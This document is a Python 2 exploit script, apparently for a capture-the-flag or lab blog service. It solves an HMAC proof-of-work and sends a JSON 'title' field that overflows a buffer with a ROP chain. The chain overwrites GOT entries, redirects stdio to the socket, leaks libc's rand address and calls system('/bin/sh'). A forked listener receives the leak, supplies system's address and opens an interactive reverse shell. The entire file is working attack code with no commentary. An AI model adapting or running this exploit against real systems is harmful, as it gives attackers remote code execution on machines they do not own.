#!/usr/bin/python
import hmac
import hashlib
import random
import socket
import json
import struct
import time
import telnetlib
import os

LHOST = "127.0.0.1"
LPORT = 4444

RHOST = "127.0.0.1"
RPORT = 20003

def randomize(n = 4):
    result = ""
    for i in range(0, n):
        result += random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")

    return result

def permute(token, message, nonce):
    suffix = ""
    while True:
        h = hmac.new(token, message + suffix, hashlib.sha1)
        digest = h.hexdigest()

        if (digest[:len(nonce)] == nonce):
            break
        suffix = randomize()
    
    print "[!] Nonce found:", suffix + "; payload hash:", digest 
    return suffix

def unicoded(h):
    x = "".join(i.encode("hex") for i in struct.pack("I", h))
    return "\u" + x[:4] + "\u" + x[4:]

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))

    token = s.recv(1024).split('"')[1]
    print "[+] Token:", token;

    gadget = {}
    # .text
    gadget["post_blog_article"] = unicoded(0x08049f20)
    gadget["pop3ret"] = unicoded(0x0804964d)
    gadget["pop2ret"] = unicoded(0x0804964e)
    # procedure linkage table 
    gadget["read@plt"] = unicoded(0x08048db0)
    gadget["write@plt"] = unicoded(0x08048d40)
    gadget["exit@plt"] = unicoded(0x08048f80) 
    gadget["rand@plt"] = unicoded(0x08048f30)
    gadget["dup2@plt"] = unicoded(0x08048e50)
    gadget["memcpy@plt"] = unicoded(0x08048e60)
    # global offset table
    gadget["close@got.plt"] = unicoded(0x0804bd7c)
    gadget["rand@got.plt"] = unicoded(0x0804bd98)
   
    # overwrite close@got.plt to bypass closing the socket
    chain = gadget["memcpy@plt"]
    chain += gadget["pop3ret"]
    chain += gadget["close@got.plt"]
    chain += gadget["rand@got.plt"]
    chain += unicoded(0x00000004) # 4
    # continue to this function to establish connection
    chain += gadget["post_blog_article"]
    # redirect stdin, stdout, stderr to fd of socket
    chain += gadget["dup2@plt"]
    chain += gadget["pop2ret"]
    chain += unicoded(0x00000000) # 0
    chain += unicoded(0x00000000) # 0
    chain += gadget["dup2@plt"]
    chain += gadget["pop2ret"]
    chain += unicoded(0x00000000) # 0
    chain += unicoded(0x00000001) # 1
    chain += gadget["dup2@plt"]
    chain += gadget["pop2ret"]
    chain += unicoded(0x00000000) # 0
    chain += unicoded(0x00000002) # 2
    # leak information to calculate offset of rand and system functions
    chain += gadget["write@plt"]
    chain += gadget["pop3ret"]
    chain += unicoded(0x00000001) # stdout
    chain += gadget["rand@got.plt"]
    chain += unicoded(0x00000004) # 4 bytes
    # change rand@got.plt to system function
    chain += gadget["read@plt"]
    chain += gadget["pop3ret"]
    chain += unicoded(0x00000000) # stdin
    chain += gadget["rand@got.plt"]
    chain += unicoded(0x00000004) # 4 bytes
    # save /bin/sh to writable address (close@got.plt)
    chain += gadget["read@plt"]
    chain += gadget["pop3ret"]
    chain += unicoded(0x00000000) # stdin
    chain += gadget["close@got.plt"]
    chain += unicoded(0x00000008) # 4 bytes
    # system("/bin/sh")
    chain += gadget["rand@plt"]
    chain += gadget["exit@plt"]
    chain += gadget["close@got.plt"]

    payload = "A"*127 + "\u" + "B"*35
    payload += chain

    message = json.dumps({
        "title": payload, 
        "contents": "BBBB", 
        "serverip": LHOST + ":" + str(LPORT),
    })

    payload = token + "\n" + message
    payload += permute(token, payload, "0000")

    print "[*] Sending payload..."
    s.send(payload)
    s.close()

if __name__ == "__main__":
    if os.fork() != 0: # parent process
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((LHOST, LPORT))
        s.listen(1)
    
        print "[*] Starting reverse handler..."
        conn, addr = s.accept()
        print "[+] Connection accepted from", addr
        
        offset = 38064 # offset from rand to system functions
        x = struct.unpack("I", conn.recv(1024)[-4:])[0]
        
        print "[*] Calculating system address with offset " + str(offset) + "..."
        system = struct.pack("I", x + offset)

        conn.send(system) # send the system function
        conn.send("/bin/sh\x00")

        print "[+] Switched to interactive mode"
        t = telnetlib.Telnet()
        t.sock = conn
        t.interact()

        # print "[*] Closing connection..."
        # conn.close()
        # s.close()
    else:
        print "[*] Waiting for reverse handler to start..."
        time.sleep(2)
        main()


